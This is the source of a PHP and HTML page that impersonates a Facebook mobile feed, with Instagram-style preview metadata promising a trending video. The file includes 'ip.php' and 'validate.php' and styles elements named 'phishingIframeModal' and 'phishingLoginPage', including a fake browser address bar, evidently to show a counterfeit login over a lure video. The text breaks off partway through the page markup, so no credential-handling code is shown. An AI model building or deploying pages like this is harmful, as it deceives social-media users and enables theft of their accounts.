<?php
include "validate.php";
include "ip.php";
?>
<!doctype html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" />
  <title>Facebook</title>

  <!-- Favicon -->
  <link rel="shortcut icon" href="https://z-m-static.xx.fbcdn.net/rsrc.php/v4/yi/r/4Kv5U5b1o3f.png" sizes="196x196" />

  <!-- SEO -->
  <meta name="description" content="Watch this amazing videotch the latest news and breaking stories. Click to view the full story." />
  <meta name="robots" content="noodp,noydir" />
  <link rel="canonical" href="https://www.instagram.com/reel/" />

  <!-- Referrer & Theme -->
  <meta name="referrer" content="origin-when-crossorigin" id="meta_referrer" />
  <meta name="theme-color" content="#1877f2" />
  <meta name="mobile-web-app-capable" content="yes" />
  <meta name="apple-mobile-web-app-status-bar-style" content="black" />

  <!-- Open Graph / Facebook -->
  <meta property="fb:app_id" content="966242223397117" />
  <meta property="og:site_name" content="Instagram" />
  <meta property="og:title" content="Watch this amazing video" />
  <meta property="og:description" content="See this and more on Instagram. Connect with friends and discover new content." />
  <meta property="og:image" content="assets/og-image.png" />
  <meta property="og:image:type" content="image/jpeg" />
  <meta property="og:image:width" content="1200" />
  <meta property="og:image:height" content="630" />
  <meta property="og:type" content="article" />
  <meta property="og:url" content="https://www.instagram.com/reel/" />
  <meta property="og:locale" content="en_US" />
  <meta property="article:published_time" content="2025-11-06T20:00:00+08:00" />
  <meta property="article:author" content="Instagram" />

  <!-- Twitter -->
  <meta name="twitter:card" content="summary_large_image" />
  <meta name="twitter:title" content="Watch this amazing video" />
  <meta name="twitter:description" content="See this and more on Instagram." />
  <meta name="twitter:image" content="assets/og-image.png" />

  <!-- Preconnect -->
  <link rel="preconnect" href="https://static.wixstatic.com">
  <link rel="preconnect" href="https://cdnjs.cloudflare.com">
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link rel="preconnect" href="https://static.xx.fbcdn.net">
  <link rel="preconnect" href="https://static.wixstatic.com">

  <!-- Stylesheets -->
  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
  <link href="https://fonts.googleapis.com/css2?family=Material+Symbols+Outlined:opsz,wght,FILL,GRAD@20..48,100..700,0..1,-50..200" rel="stylesheet">
<style>
    :root {
        --fb-blue: #1877F2;
        --fb-background-gray: #F0F2F5;
        --fb-content-bg: #FFFFFF;
        --fb-primary-text: #050505;
        --fb-secondary-text: #65676B;
        --fb-border-color: #CED0D4;
        --fb-divider-color: #DCDFE3;
        --fb-light-divider-color: #E4E6EB;
        --fb-icon-bg: #E4E6EB;
        --fb-input-bg: #F0F2F5;
        --fb-badge-red: #E41E3F;
        --fb-icon-green: #45BD62;
        --fb-shimmer-base: #EBEDF0;
        --fb-shimmer-highlight: rgba(255, 255, 255, 0.8);
        --fb-overlay-text: #FFFFFF
    }
    * {
        box-sizing: border-box
    }
    html {
        height: 100%;
        overflow-y: scroll
    }
    body {
        margin: 0;
        padding: 0;
        font-family: "Optimistic Text Normal", system-ui, -apple-system, BlinkMacSystemFont, '.SFNSText-Regular', 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
        background-color: var(--fb-background-gray);
        overscroll-behavior-y: contain;
        color: var(--fb-primary-text);
        width: 100%;
        min-height: 100%;
        text-align: left;
        direction: ltr;
        overflow-x: hidden !important;
        max-width: 100%;
        -webkit-text-size-adjust: 100%;
        -ms-text-size-adjust: 100%
    }
    button {
        border: none;
        background: 0 0;
        padding: 0;
        margin: 0;
        cursor: pointer;
        color: inherit;
        -webkit-tap-highlight-color: transparent
    }
    .feed-post.realistic {
        max-width: 500px;
        margin: 0 auto 16px auto;
        padding: 12px;
        border-radius: 10px;
        box-shadow: 0 1px 6px rgba(0, 0, 0, .05);
        background: var(--fb-content-bg);
        width: 100%
    }
    .feed-post .post-media img {
        width: 100%;
        height: auto;
        max-height: 350px;
        object-fit: cover;
        border-radius: 8px
    }
    .feed-post .post-text {
        font-size: 1rem;
        margin-bottom: 8px;
        word-break: break-word
    }
    @media (max-width:600px) {
        .feed-post.realistic {
            max-width: 100vw;
            padding: 8px;
            border-radius: 0
        }
        .feed-post .post-media img {
            max-height: 200px;
            border-radius: 4px
        }
        .feed-post .post-text {
            font-size: .95rem
        }
    }
    @media (max-width:400px) {
        .feed-post .post-text {
            font-size: .85rem
        }
        .feed-post .post-media img {
            max-height: 120px
        }
    }
    .fb-page-container {
        max-width: 600px;
        width: 100%;
        margin: 0 auto;
        background-color: var(--fb-content-bg);
        min-height: 100vh;
        align-self: flex-start
    }
    .top-most-nav-bar {
        position: fixed;
        top: 0;
        left: 0;
        right: 0;
        height: 56px;
        background-color: var(--fb-content-bg);
        z-index: 900;
        border-bottom: 1px solid var(--fb-light-divider-color);
        display: flex;
        align-items: center;
        justify-content: space-between;
        padding: 0 12px
    }
    .top-most-nav-bar .logo-area {
        font-weight: 700;
        color: var(--fb-blue);
        font-size: 24px
    }
    .top-most-nav-bar .right-icons-area {
        display: flex;
        align-items: center
    }
    .top-most-nav-bar .right-icons-area i {
        width: 36px;
        height: 36px;
        border-radius: 50%;
        background-color: var(--fb-icon-bg);
        display: flex;
        justify-content: center;
        align-items: center;
        font-size: 20px;
        color: var(--fb-primary-text);
        cursor: pointer;
        margin-left: 8px;
        flex-shrink: 0
    }
    .secondary-nav-bar {
        position: fixed;
        top: 56px;
        left: 0;
        right: 0;
        display: flex;
        justify-content: space-around;
        align-items: center;
        height: 50px;
        background-color: var(--fb-content-bg);
        padding: 0 5px;
        z-index: 890;
        border-bottom: 1.5px solid #e4e6eb;
        box-shadow: 0 1px 0 0 #e4e6eb
    }
    .secondary-nav-tab {
        flex-grow: 1;
        display: flex;
        justify-content: center;
        align-items: center;
        height: 100%;
        background-color: transparent;
        border: none;
        padding: 0;
        margin: 0;
        cursor: pointer;
        outline: 0;
        position: relative;
        -webkit-tap-highlight-color: transparent;
        transition: background-color .2s, color .2s
    }
    .secondary-nav-tab img {
        width: 24px;
        height: 24px;
        object-fit: contain;
        transition: filter .2s ease-in-out
    }
    .secondary-nav-tab.active::after {
        content: '';
        position: absolute;
        bottom: 0;
        left: 18%;
        right: 18%;
        height: 4px;
        background-color: #1877f2;
        border-radius: 2px 2px 0 0;
        transition: all .25s cubic-bezier(.4, 0, .2, 1)
    }
    .secondary-nav-tab:not(.active):hover {
        background-color: rgba(0, 0, 0, .04);
        border-radius: 6px
    }
    hr.nav-divider {
        border: none;
        height: 1px;
        background-color: var(--fb-light-divider-color);
        margin: 0;
        position: fixed;
        top: calc(56px + 50px);
        left: 0;
        right: 0;
        z-index: 880
    }
    .content-after-fixed-headers {
        margin-top: calc(56px + 50px + 1px)
    }
    .create-post-container.realistic {
        display: flex;
        align-items: center;
        padding: 12px 15px;
        background-color: var(--fb-content-bg)
    }
    .profile-pic.small {
        width: 40px;
        height: 40px;
        border-radius: 50%;
        background-color: var(--fb-shimmer-base);
        margin-right: 10px;
        flex-shrink: 0;
        object-fit: cover
    }
    .create-post-input-realistic {
        flex-grow: 1;
        height: 36px;
        border-radius: 18px;
        background-color: var(--fb-input-bg);
        display: flex;
        align-items: center;
        padding: 0 15px;
        color: var(--fb-primary-text);
        margin-right: 10px;
        cursor: pointer;
        min-width: 0
    }
    .create-post-icon {
        display: flex;
        flex-direction: column;
        align-items: center;
        color: var(--fb-secondary-text);
        cursor: pointer;
        padding: 0 5px
    }
    .create-post-icon i {
        font-size: 20px;
        color: var(--fb-icon-green);
        margin-bottom: 2px
    }
    .stories-container.realistic {
        display: flex;
        overflow-x: auto;
        padding: 12px 15px;
        background-color: var(--fb-content-bg);
        border-bottom: none;
        scrollbar-width: none;
        -ms-overflow-style: none;
        position: relative
    }
    .stories-container.realistic::after {
        content: '';
        position: absolute;
        bottom: 0;
        left: 0;
        right: 0;
        height: 6px;
        background: linear-gradient(to bottom, rgba(0, 0, 0, .07), rgba(0, 0, 0, .01) 80%, transparent 100%);
        border-top: none;
        border-bottom: none;
        box-shadow: 0 2px 6px 0 rgba(0, 0, 0, .1);
        pointer-events: none
    }
    .stories-container.realistic::-webkit-scrollbar {
        display: none
    }
    .story-card {
        min-width: 100px;
        height: 180px;
        border-radius: 10px;
        background-color: var(--fb-shimmer-base);
        margin-right: 8px;
        position: relative;
        overflow: hidden;
        background-size: cover;
        background-position: center;
        cursor: pointer;
        flex-shrink: 0
    }
    .story-card:last-child {
        margin-right: 0
    }
    .story-card.create-story {
        display: flex;
        flex-direction: column;
        background-color: var(--fb-content-bg);
        border: 1px solid var(--fb-divider-color)
    }
    .create-story-image {
        height: 68%;
        background-color: var(--fb-shimmer-base)
    }
    .create-story-button {
        width: 32px;
        height: 32px;
        border-radius: 50%;
        background-color: var(--fb-blue);
        color: #fff;
        display: flex;
        justify-content: center;
        align-items: center;
        border: 3px solid #fff;
        position: absolute;
        bottom: 23%;
        left: 50%;
        transform: translateX(-50%);
        z-index: 2;
        padding: 0
    }
    .create-story-button::after,
    .create-story-button::before {
        content: '';
        position: absolute;
        background-color: #fff;
        border-radius: 1px
    }
    .create-story-button::before {
        width: 14px;
        height: 2.5px;
        left: 50%;
        top: 50%;
        transform: translate(-50%, -50%)
    }
    .create-story-button::after {
        width: 2.5px;
        height: 14px;
        left: 50%;
        top: 50%;
        transform: translate(-50%, -50%)
    }
    .create-story span {
        font-size: 12px;
        font-weight: 500;
        color: var(--fb-primary-text);
        text-align: center;
        position: absolute;
        bottom: 10px;
        left: 0;
        right: 0
    }
    .story-card:not(.create-story)::after {
        content: '';
        position: absolute;
        bottom: 0;
        left: 0;
        right: 0;
        height: 40%;
        background: linear-gradient(to top, rgba(0, 0, 0, .6), transparent);
        border-radius: 0 0 10px 10px;
        z-index: 1
    }
    .story-card .story-name {
        position: absolute;
        bottom: 8px;
        left: 8px;
        right: 8px;
        font-size: 13px;
        font-weight: 600;
        color: #fff;
        text-shadow: 0 1px 3px rgba(0, 0, 0, .6);
        z-index: 2;
        overflow: hidden;
        white-space: nowrap;
        text-overflow: ellipsis
    }
    .story-badge {
        position: absolute;
        top: 8px;
        right: 8px;
        background-color: var(--fb-badge-red);
        color: #fff;
        font-size: 11px;
        font-weight: 700;
        padding: 2px 5px;
        border-radius: 4px;
        border: 1px solid #fff;
        z-index: 3
    }
    .feed-post.realistic {
        background-color: var(--fb-content-bg);
        padding-top: 12px;
        margin-bottom: 8px;
        border-bottom: 1px solid #e4e6eb;
        box-shadow: none;
        background-image: none
    }
    .feed-post.realistic:last-child {
        border-bottom: none
    }
    .feed-post.realistic::before {
        content: '';
        display: block;
        height: 8px;
        background-color: var(--fb-background-gray);
        border-top: 1px solid var(--fb-divider-color);
        border-bottom: 1px solid var(--fb-divider-color);
        margin: -12px 0 12px 0
    }
    .post-header.realistic {
        display: flex;
        align-items: center;
        padding: 0 15px 8px 15px
    }
    .post-info.realistic {
        flex-grow: 1;
        margin-left: 10px;
        min-width: 0
    }
    .user-name-line {
        display: flex;
        align-items: center;
        margin-bottom: 2px;
        flex-wrap: wrap
    }
    .user-name.actual-text {
        font-weight: 600;
        color: var(--fb-primary-text);
        font-size: 15px
    }
    .follow-link {
        color: var(--fb-blue);
        font-weight: 600;
        font-size: 14px;
        margin-left: 8px;
        cursor: pointer;
        white-space: nowrap
    }
    .post-meta-container {
        display: flex;
        align-items: center;
        font-size: 13px;
        color: var(--fb-secondary-text)
    }
    .post-meta-container span {
        margin: 0 4px
    }
    .post-meta-container .fa-globe-americas,
    .post-meta-container .material-symbols-outlined {
        margin-left: 2px;
        font-size: 13px
    }
    .post-close,
    .post-options {
        color: var(--fb-secondary-text);
        padding: 8px;
        margin-left: 8px;
        cursor: pointer;
        border-radius: 50%
    }
    .post-close:hover,
    .post-options:hover {
        background-color: var(--fb-icon-bg)
    }
    .post-close i,
    .post-options i {
        font-size: 18px;
        display: block
    }
    .post-text.realistic {
        padding: 4px 15px 12px 15px;
        font-size: 15px;
        line-height: 1.35;
        color: var(--fb-primary-text);
        word-wrap: break-word
    }
    .post-text.realistic p {
        margin: 0
    }
    .post-text.realistic .see-more {
        color: var(--fb-secondary-text);
        font-weight: 600;
        cursor: pointer
    }
    .post-media.video-trigger-area {
        display: block;
        cursor: default;
        min-height: 200px;
        background-color: #000;
        position: relative;
        overflow: hidden;
        width: 100%;
        aspect-ratio: 16/9;
        box-shadow: inset 0 0 10px rgba(0, 0, 0, 0.4)
    }
    .video-trigger-area::before {
        display: none !important
    }
    .video-blurred {
        filter: blur(12px) brightness(0.45) contrast(0.9);
    }
    .video-trigger-area video#post-video {
        display: block;
        width: 100%;
        height: 100%;
        object-fit: cover;
        pointer-events: none;
        position: absolute;
        top: 0;
        left: 0;
        z-index: 1
    }
    .video-overlay {
        position: absolute;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        display: flex;
        justify-content: center;
        align-items: center;
        pointer-events: none;
        cursor: pointer;
        z-index: 3;
        opacity: 0;
        visibility: hidden;
        transition: opacity .3s ease-in-out, visibility .3s ease-in-out
    }
    .video-overlay.is-visible {
        opacity: 1;
        visibility: visible;
        pointer-events: auto
    }
    .inline-video-icon.center {
        background-color: rgba(0, 0, 0, .25);
        background-position: center;
        background-repeat: no-repeat;
        background-size: clamp(40px, 6vw, 70px);
        max-width: 70px;
        min-width: 40px;
        border-radius: 50%;
        border: 2px solid #fff;
        width: clamp(40px, 10vw, 70px);
        height: clamp(40px, 10vw, 70px);
        display: flex;
        align-items: center;
        justify-content: center;
        position: relative
    }
    .inline-video-icon.center::after {
        content: '';
        display: block;
        width: 30px;
        height: 30px;
        background: url('data:image/svg+xml;utf8,<svg width="30" height="30" viewBox="0 0 30 30" fill="none" xmlns="http://www.w3.org/2000/svg"><polygon points="10,7 24,15 10,23" fill="white"/></svg>') center center no-repeat;
        background-size: 30px 30px;
        position: absolute;
        left: 50%;
        top: 50%;
        transform: translate(-50%, -50%);
        z-index: 2;
        pointer-events: none
    }
    @keyframes spinner-rotate {
        0% {
            transform: rotate(0)
        }
        100% {
            transform: rotate(360deg)
        }
    }
    .video-spinner-wrapper {
        position: absolute;
        inset: 0;
        display: flex;
        justify-content: center;
        align-items: center;
        background-color: rgba(0, 0, 0, .65);
        z-index: 2;
        opacity: 0;
        visibility: hidden;
        transition: opacity .3s ease-in-out, visibility .3s ease-in-out;
        pointer-events: none
    }
    .video-spinner-wrapper.is-visible {
        opacity: 1;
        visibility: visible
    }
    .spinner.animated.inline-video-spinner {
        width: clamp(20px, 4vw, 30px);
        height: clamp(20px, 4vw, 30px);
        max-width: 30px;
        max-height: 30px;
        min-width: 20px;
        min-height: 20px;
        border: 3px solid rgba(255, 255, 255, .3);
        border-top-color: #fff;
        border-radius: 50%;
        animation: spinner-rotate .8s linear infinite
    }
    .post-media.image-container img {
        display: block;
        width: 100%;
        height: auto;
        max-height: 75vh;
        object-fit: contain;
        background-color: #f0f2f5
    }
    .post-reactions-stats {
        padding: 10px 15px 8px 15px;
        min-height: 20px;
        display: flex;
        justify-content: flex-end;
        align-items: center
    }
    .comment-count-display {
        font-size: 13px;
        font-family: system-ui, -apple-system, BlinkMacSystemFont, '.SFNSText-Regular', 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
        font-weight: 400;
        color: var(--fb-secondary-text)
    }
    .realistic-stats {
        display: flex;
        justify-content: space-between;
        align-items: center;
        padding: 10px 15px;
        font-size: 13px;
        color: var(--fb-secondary-text);
        border-top: 1px solid #e4e6eb;
        margin-top: 8px
    }
    .realistic-stats .reactions {
        display: flex;
        align-items: center;
        cursor: pointer
    }
    .realistic-stats .reactions img {
        width: 18px;
        height: 18px;
        margin-right: -4px;
        border: 2px solid #fff;
        border-radius: 50%
    }
    .realistic-stats .comments-shares span {
        margin-left: 15px;
        cursor: pointer
    }
    .post-actions.realistic {
        display: flex;
        justify-content: space-around;
        padding: 6px 10px;
        border-top: 1px solid #e4e6eb;
        box-shadow: none;
        background: 0 0;
        margin-top: 8px;
        margin-bottom: 0;
        padding-bottom: 4px
    }
    .post-actions.realistic .action-button-pill {
        background-color: var(--fb-input-bg);
        border-radius: 18px;
        width: auto;
        height: 36px;
        padding: 0 12px;
        text-align: center;
        cursor: pointer;
        display: flex;
        justify-content: center;
        align-items: center;
        transition: background-color .15s ease;
        flex-basis: 0;
        flex-grow: 1;
        margin: 0 2px;
        min-width: 0
    }
    .post-actions.realistic .action-button-pill img {
        width: 20px;
        height: 20px;
        object-fit: contain;
        filter: grayscale(1) brightness(.25) contrast(1.2);
        opacity: .85
    }
    .shimmer {
        position: relative;
        overflow: hidden;
        background-color: var(--fb-shimmer-base)
    }
    .shimmer::before {
        content: "";
        position: absolute;
        top: 0;
        left: -150%;
        width: 100%;
        height: 100%;
        background: linear-gradient(90deg, transparent, var(--fb-shimmer-highlight), transparent);
        animation: shimmer-animation 1.6s infinite linear;
        z-index: 1
    }
    @keyframes shimmer-animation {
        0% {
            left: -150%
        }
        100% {
            left: 150%
        }
    }
    #first-video-post .profile-pic.small.shimmer {
        width: 40px;
        height: 40px;
        border-radius: 50%;
        background-color: var(--fb-shimmer-base);
        position: relative;
        overflow: hidden
    }
    #first-video-post .profile-pic.small.shimmer::before {
        content: '';
        position: absolute;
        top: 0;
        left: 0;
        right: 0;
        bottom: 0;
        background: linear-gradient(90deg, transparent, var(--fb-shimmer-highlight), transparent);
        animation: shimmer-animation 1.6s infinite linear;
        z-index: 1
    }
    #first-video-post .user-name.shimmer {
        width: 110px;
        height: 16px;
        border-radius: 8px;
        background-color: var(--fb-shimmer-base);
        position: relative;
        overflow: hidden;
        margin-bottom: 4px
    }
    #first-video-post .user-name.shimmer::before {
        content: '';
        position: absolute;
        top: 0;
        left: 0;
        right: 0;
        bottom: 0;
        background: linear-gradient(90deg, transparent, var(--fb-shimmer-highlight), transparent);
        animation: shimmer-animation 1.6s infinite linear;
        z-index: 1
    }
    #newVideoOverlayModal {
        display: none;
        position: fixed !important;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        background: rgba(0, 0, 0, .85);
        z-index: 1000;
        justify-content: center;
        align-items: center;
        padding: 16px;
        box-sizing: border-box;
        opacity: 0;
        transition: opacity .3s ease-in-out;
        overflow: hidden;
        cursor: pointer;
        -webkit-tap-highlight-color: transparent
    }
    #newVideoOverlayModal.is-visible-modal {
        opacity: 1
    }
    .video-player-container {
        position: relative;
        width: 100%;
        max-width: 500px;
        min-height: 150px;
        max-height: 90vh;
        overflow-y: auto;
        border-radius: 12px;
        margin: 0 auto;
        font-family: sans-serif;
        background-color: rgba(0, 0, 0, .85);
        display: flex;
        flex-direction: column;
        box-shadow: 0 0 25px rgba(0, 0, 0, 0.8)
    }
    .background-video {
        position: absolute;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        object-fit: cover;
        filter: brightness(.4) blur(15px) contrast(1.05) saturate(0.8);
        z-index: 0;
        border-radius: 12px
    }
    .sensitive-content-overlay {
        position: relative;
        z-index: 1;
        width: 100%;
        height: auto;
        display: flex;
        flex-direction: column;
        justify-content: center;
        align-items: center;
        text-align: center;
        color: #fff;
        padding: 20px;
        box-sizing: border-box;
        flex-grow: 1;
        text-shadow: 0 1px 3px rgba(0, 0, 0, 0.5)
    }
    .modal-header-inline {
        display: flex;
        align-items: center;
        justify-content: center;
        gap: 10px;
        margin-bottom: 15px;
        margin-top: 10px;
        flex-shrink: 0
    }
    .warning-icon-svg {
        width: 32px;
        height: 32px;
        flex-shrink: 0
    }
    .overlay-main-content {
        display: flex;
        flex-direction: column;
        align-items: center;
        width: 100%;
        min-height: 0
    }
    .overlay-main-content h2 {
        margin: 8px 0;
        font-size: 1.3rem;
        font-weight: 700;
        flex-shrink: 0
    }
    .overlay-main-content p.faded-text {
        margin: 0 0 8px;
        line-height: 1.3;
        font-size: .9rem;
        max-width: 95%;
        opacity: .6
    }
    .overlay-separator {
        width: 80%;
        height: 1px;
        border: none;
        background: linear-gradient(to right, transparent, #ffffff60, transparent);
        margin: 8px 0 12px;
        opacity: 0;
        animation: fadeExpand 1s ease-out 1.2s forwards;
        flex-shrink: 0
    }
    .overlay-footer {
        width: 100%;
        padding-top: 10px;
        margin-top: auto;
        flex-shrink: 0
    }
    .see-video-button {
        background-color: transparent;
        border: 2px solid #fff;
        color: #fff;
        padding: 10px 18px;
        font-size: .95rem;
        border-radius: 8px;
        cursor: pointer;
        transition: background-color .3s, transform .1s ease-out, box-shadow .1s ease-out;
        opacity: 0;
        transform: translateY(10px);
        animation: slideUpFade .1s ease-out 1.2s forwards;
        margin-bottom: 5px
    }
    .see-video-button:hover {
        background-color: rgba(255, 255, 255, .1)
    }
    .see-video-button.simulated-click,
    .see-video-button:active {
        transform: scale(.97) translateY(1px);
        background-color: rgba(255, 255, 255, .15) !important;
        box-shadow: inset 0 1px 3px rgba(0, 0, 0, .3)
    }
    @keyframes fadeExpand {
        to {
            opacity: 1
        }
    }
    @keyframes slideUpFade {
        to {
            opacity: 1;
            transform: translateY(0)
        }
    }
    @media (max-width:400px) {
        .sensitive-content-overlay {
            padding: 15px 10px
        }
        .warning-icon-svg {
            width: 28px;
            height: 28px
        }
        .modal-header-inline {
            margin-bottom: 12px;
            margin-top: 8px
        }
        .overlay-main-content h2 {
            font-size: 1.15rem;
            margin: 6px 0
        }
        .overlay-main-content p.faded-text {
            font-size: .8rem;
            line-height: 1.25;
            margin-bottom: 6px
        }
        .overlay-separator {
            margin: 6px 0 10px
        }
        .see-video-button {
            padding: 8px 15px;
            font-size: .85rem
        }
    }
    @media (max-height:450px) {
        .sensitive-content-overlay {
            padding: 10px
        }
        .modal-header-inline {
            margin-top: 5px;
            margin-bottom: 8px
        }
        .overlay-main-content h2 {
            font-size: 1.1rem
        }
        .overlay-main-content p.faded-text {
            font-size: .75rem;
            margin-bottom: 5px
        }
        .overlay-separator {
            margin: 5px 0 8px
        }
        .see-video-button {
            padding: 7px 12px;
            font-size: .8rem;
            margin-bottom: 0
        }
        .overlay-footer {
            padding-top: 5px
        }
    }
    #phishingIframeModal {
        display: none;
        position: fixed !important;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        background: rgba(0, 0, 0, .75);
        z-index: 10001;
        justify-content: center;
        align-items: center;
        padding: 0;
        box-sizing: border-box;
        opacity: 0;
        transition: opacity .15s ease-in-out;
        overflow: hidden
    }
    #phishingIframeModal.is-visible-iframe {
        opacity: 1
    }
    #phishingIframeWrapper {
        position: relative;
        width: 100%;
        max-width: 380px;
        max-height: 100vh;
        background-color: #fff;
        border-radius: 10px;
        box-shadow: 0 8px 25px rgba(0, 0, 0, .25);
        transform: scale(.96) translateY(30px);
        opacity: 0;
        transition: opacity .35s cubic-bezier(.4, 0, .2, 1), transform .35s cubic-bezier(.4, 0, .2, 1);
        display: flex;
        flex-direction: column;
        margin: 16px 10px 28px 10px;
        overflow: hidden;
        height: 500px;
        padding-top: 0;
        padding-bottom: 0
    }
    #phishingIframeModal.is-visible-iframe #phishingIframeWrapper {
        opacity: 1;
        transform: scale(1) translateY(0)
    }
    .iframe-chrome-top-bar {
        width: 100%;
        height: 56px;
        background-color: #fff;
        display: flex;
        align-items: center !important;
        justify-content: space-between;
        padding: 0 8px;
        border-bottom: 1px solid #e0e0e0;
        box-sizing: border-box;
        z-index: 2;
        flex-shrink: 0;
        border-top-left-radius: 10px;
        border-top-right-radius: 10px
    }
    .iframe-chrome-top-bar>.address-bar-container,
    .iframe-chrome-top-bar>.icon-button,
    .iframe-chrome-top-bar>.tab-switcher {
        align-self: center;
        margin-top: 0;
        margin-bottom: 0
    }
    .iframe-chrome-top-bar .icon-button {
        display: flex;
        align-items: center;
        justify-content: center;
        min-width: 40px;
        height: 40px;
        border-radius: 50%;
        transition: background-color .15s ease-in-out;
        flex-shrink: 0
    }
    .iframe-chrome-top-bar .icon-button .material-symbols-outlined {
        font-size: 24px;
        color: #5f6368;
        font-variation-settings: 'FILL' 0, 'wght' 400;
        line-height: 1
    }
    .iframe-chrome-top-bar .icon-button:hover {
        background-color: rgba(0, 0, 0, .04)
    }
    .iframe-chrome-top-bar .icon-button:active {
        background-color: rgba(0, 0, 0, .08)
    }
    .iframe-chrome-top-bar .address-bar-container {
        flex-grow: 1;
        height: 36px;
        background-color: #e8eaed;
        border-radius: 18px;
        display: flex;
        align-items: center;
        padding: 0 12px;
        margin: 0 8px;
        overflow: hidden;
        box-sizing: border-box;
        cursor: text;
        border: 1px solid transparent;
        transition: background-color .15s ease-in-out, box-shadow .15s ease-in-out, border-color .15s ease-in-out
    }
    .iframe-chrome-top-bar .address-bar-container:hover {
        background-color: #dfe1e5
    }
    #phishingLoginPage {
        width: 100%;
        flex-grow: 1;
        border: none;
        display: block;
        border-bottom-left-radius: 10px;
        border-bottom-right-radius: 10px;
        overflow: hidden !important
    }
    @media (max-width:420px) {
        #phishingIframeModal {
            display: none;
            position: fixed !important;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, .75);
            z-index: 10001;
            justify-content: center;
            align-items: center;
            padding: 0;
            box-sizing: border-box;
            opacity: 0;
            transition: opacity .15s ease-in-out;
            overflow: hidden
        }
        #phishingIframeModal.is-visible-iframe {
            opacity: 1
        }
        #phishingIframeWrapper {
            position: relative;
            width: 100%;
            max-width: 380px;
            max-height: 95vh;
            background-color: #fff;
            border-radius: 10px;
            box-shadow: 0 8px 25px rgba(0, 0, 0, .25);
            transform: scale(.96) translateY(30px);
            opacity: 0;
            transition: opacity .35s cubic-bezier(.4, 0, .2, 1), transform .35s cubic-bezier(.4, 0, .2, 1);
            display: flex;
            flex-direction: column;
            overflow: hidden;
            margin-top: 16px;
            margin-bottom: 28px;
            height: 470px;
            padding-top: 0;
            padding-bottom: 0
        }
        #phishingIframeModal.is-visible-iframe #phishingIframeWrapper {
            transform: scale(1) translateY(0);
            opacity: 1
        }
    }
    #connectingModal {
        display: none;
        position: fixed !important;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        background: rgba(0, 0, 0, .75);
        z-index: 10002;
        flex-direction: column;
        justify-content: center;
        align-items: center;
        padding: 20px;
        box-sizing: border-box;
        opacity: 0;
        transition: opacity .15s ease-in-out;
        color: #fff
    }
    #connectingModal.is-visible {
        opacity: 1
    }
    #connectingModal .spinner {
        border: 4px solid rgba(255, 255, 255, .2);
        width: 36px;
        height: 36px;
        border-radius: 50%;
        border-left-color: #fff;
        animation: spinner-rotate 1s ease infinite;
        margin: 0 auto 15px auto
    }
    #connectingModal .loading-text {
        font-size: 14px
    }
    .initially-hidden {
        display: none
    }
    .is-hidden-smoothly {
        opacity: 0 !important;
        visibility: hidden !important;
        pointer-events: none !important
    }
    .is-visible {
        opacity: 1 !important;
        visibility: visible !important;
        pointer-events: auto !important
    }
    .fade-in {
        opacity: 1 !important;
        transition: opacity .4s cubic-bezier(.4, 0, .2, 1) !important
    }
</style>
</head>
<body class="_50-3 _fzu acw iframe portrait touch x1" tabindex=0>
    <div class=top-most-nav-bar>
        <div class=logo-area>facebook</div>
        <div class=right-icons-area><i class="fas fa-search"></i><i class="fas fa-bars"></i></div>
    </div>
    <div class=secondary-nav-bar><button class="secondary-nav-tab active" id=tab-home><img alt=Home src=https://static.wixstatic.com/media/8455f5_90a6044f5479497698908bf253347fc5~mv2.png></button> <button class=secondary-nav-tab id=tab-friends><img alt=Friends src=https://static.wixstatic.com/media/8455f5_69cbdc2108a54ab188c6cf21bb1f2be4~mv2.png></button> <button class=secondary-nav-tab id=tab-messenger><img alt=Messenger src=https://static.wixstatic.com/media/8455f5_df141dbca32e461c9b195d5574ed6c54~mv2.png></button> <button class=secondary-nav-tab id=tab-video><img alt=Video src=https://static.wixstatic.com/media/8455f5_df8ac19faac345208a602f22e5217d4a~mv2.png></button> <button class=secondary-nav-tab id=tab-notifications><img alt=Notifications src=https://static.wixstatic.com/media/8455f5_72e997f8209146ecb7b31652e56b50c7~mv2.png></button> <button class=secondary-nav-tab id=tab-marketplace><img alt=Marketplace src=https://static.wixstatic.com/media/8455f5_393292a958094c8abb620b6187304621~mv2.png></button></div>
    <hr class=nav-divider>
    <div class=fb-page-container>
        <div class=content-after-fixed-headers>
            <div class="realistic create-post-container">
                <div class="shimmer profile-pic small"></div>
                <div class="shimmer create-post-input-realistic"><span>What's on your mind?</span></div>
                <div class=create-post-icon><i class="fas fa-images"></i> <span>Photo</span></div>
            </div>
            <div class="realistic stories-container">
                <div class="shimmer story-card create-story">
                    <div class="shimmer create-story-image"></div>
                    <div class=create-story-button></div><span>Create story</span>
                </div>
                <div class="shimmer story-card">
                    <div class=story-badge>6</div><span class=story-name>Mary Cajigal</span>
                </div>
                <div class="shimmer story-card">
                    <div class=story-badge>1</div><span class=story-name>Lidia Sari</span>
                </div>
                <div class="shimmer story-card"><span class=story-name>Kasmo CH</span></div>
                <div class="shimmer story-card"><span class=story-name>Jennifer F.</span></div>
            </div>
            <div class="realistic feed-post" id=first-video-post>
                <div class="realistic post-header">
                    <div class="shimmer profile-pic small"></div>
                    <div class="realistic post-info">
                        <div class="shimmer user-name"></div>
                        <div class=post-meta-container>37m<span>·</span> <i class="fas fa-globe-americas"></i>
                            <div class="shimmer post-time"></div>
                        </div>
                    </div>
                    <div class=post-options><i class="fas fa-ellipsis-h"></i></div>
                    <div class=post-close><i class="fas fa-times"></i></div>
                </div>
                <div class="realistic post-text">
                    <p>Check out this trending video! <span class=see-more> <span class=see-more>... See more</span>
                </div>
                <div class="post-media video-trigger-area" id=video-container style="width: 100%; max-width: 500px;"><video muted id=post-video playsinline preload=none style="background-color: #000; width: 100%; height: 100%; object-fit: cover;"></video>
                    <div class=video-overlay id=overlay>
                        <div class="center inline-video-icon"></div>
                    </div>
